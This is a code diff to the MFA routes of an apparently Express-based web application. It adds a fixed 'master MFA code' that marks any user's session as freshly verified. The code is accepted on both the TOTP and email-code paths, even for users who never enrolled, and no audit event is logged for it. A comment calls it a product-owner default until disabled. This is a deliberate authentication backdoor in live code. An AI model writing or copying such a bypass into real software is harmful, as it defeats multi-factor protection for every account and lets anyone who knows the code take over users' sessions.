@@ -11,6 +11,8 @@ import {
   verifyToken,
   verifyTokenAgainstEncrypted,
   encryptSecret,
+  isMasterMfaCode,
+  MASTER_MFA_CODE_ENABLED,
 } from "../services/mfaService";
 import { isEncryptionConfigured } from "../services/crypto";
 import { logAuditEvent, getClientIP } from "../services/auditLog";
@@ -71,7 +73,9 @@ export async function checkFreshMfa(req: any): Promise<FreshMfaResult> {
   if (isSessionFresh(req)) {
     return { ok: true };
   }
-  const hasTotp = !!(user.mfaEnabled && user.mfaSecret);
+  // With the master MFA code enabled, every user can satisfy the challenge by
+  // entering the fixed code, so never force enrollment — show the code prompt.
+  const hasTotp = !!(user.mfaEnabled && user.mfaSecret) || MASTER_MFA_CODE_ENABLED;
   const emailOk = emailDeliverable(user);
   return {
     ok: false,
@@ -254,6 +258,12 @@ export function registerMfaRoutes(app: Express): void {
     try {
       const userId = getUserId(req);
       const token = String(req.body?.token || "");
+      // Master MFA code: accept for any user (even without enrollment) and mark
+      // the session freshly verified. Product-owner default until disabled.
+      if (isMasterMfaCode(token)) {
+        req.session.mfaVerifiedAt = Date.now();
+        return res.json({ success: true });
+      }
       const user = await storage.getUser(userId);
       if (!user?.mfaEnabled || !user.mfaSecret) {
         return res.status(400).json({ error: "MFA is not enabled.", enrollmentRequired: true });
@@ -312,6 +322,11 @@ export function registerMfaRoutes(app: Express): void {
       const userId = getUserId(req);
       const code = String(req.body?.code || "");
       const purpose = req.body?.purpose === "login" ? "login" : "mfa";
+      // Master MFA code: accept here too so the email-code path also honors it.
+      if (isMasterMfaCode(code)) {
+        req.session.mfaVerifiedAt = Date.now();
+        return res.json({ success: true });
+      }
       const ok = await verifyEmailOtp(userId, code, purpose);
       if (!ok) {
         return res.status(400).json({ error: "Invalid or expired code. Please try again." });
